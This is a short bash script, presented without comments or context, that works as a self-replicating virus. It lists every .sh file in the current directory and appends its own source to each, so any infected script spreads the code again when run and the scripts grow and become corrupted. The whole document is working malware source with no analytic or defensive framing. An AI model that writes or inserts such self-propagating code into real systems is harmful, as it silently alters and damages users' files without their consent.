#!/bin/bash

files=`ls *.sh`

files=($(echo $files | tr " " "\n"))
initial=`cat $0`

for file in "${files[@]}"; do
    echo -e "\n" >> "$file"
    cat $0 >> "$file"
done

echo -e "\n$initial" > $0